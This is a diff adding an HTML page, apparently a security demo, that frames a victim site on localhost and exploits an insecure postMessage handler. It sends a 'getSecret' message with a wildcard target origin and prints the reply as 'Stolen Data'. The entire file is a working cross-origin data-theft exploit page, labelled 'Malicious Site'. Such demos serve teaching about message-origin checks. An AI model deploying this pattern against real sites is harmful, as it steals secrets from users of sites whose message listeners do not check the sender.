@@ -1,0 +1,34 @@
+<!-- attacker.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Attacker Page</title>
+  <style>
+    body { font-family: Arial; background-color: #ffe6e6; padding: 20px; }
+  </style>
+</head>
+<body>
+  <h2>Malicious Site</h2>
+  <p>Click the button to extract secrets from the victim site.</p>
+  <button onclick="exploit()">Steal Secret</button>
+  <div id="output" style="margin-top: 100px; font-weight: bold;"></div>
+
+  <iframe id="victimFrame" src="http://localhost:8000/index.html" style="width:100%; height:300%; border:2px solid black;"></iframe>
+
+  <script>
+    function exploit() {
+      const victimFrame = document.getElementById('victimFrame').contentWindow;
+
+      // Listen for secret data sent back
+      window.addEventListener("message", function(event) {
+        // Normally, we should check origin here, but this is the attacker
+        document.getElementById("output").textContent = "Stolen Data: " + event.data;
+      }, false);
+
+      // Send malicious message
+      victimFrame.postMessage("getSecret", "*");
+    }
+  </script>
+</body>
+</html>
+
